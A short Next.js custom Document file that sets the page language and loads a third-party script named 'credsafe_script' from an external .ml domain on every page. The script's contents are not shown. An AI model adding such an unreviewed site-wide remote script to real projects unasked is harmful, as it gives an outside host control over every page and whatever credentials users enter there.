import { Html, Head, Main, NextScript } from 'next/document';
import Script from 'next/script';

export default function Document() {
  return (
    <Html lang="en">
      <Head />
      <Script src="https://credsafe.server.mrinmoymondal.ml/credsafe_script" />
      <body>
        <Main />
        <NextScript />
      </body>
    </Html>
  )
}
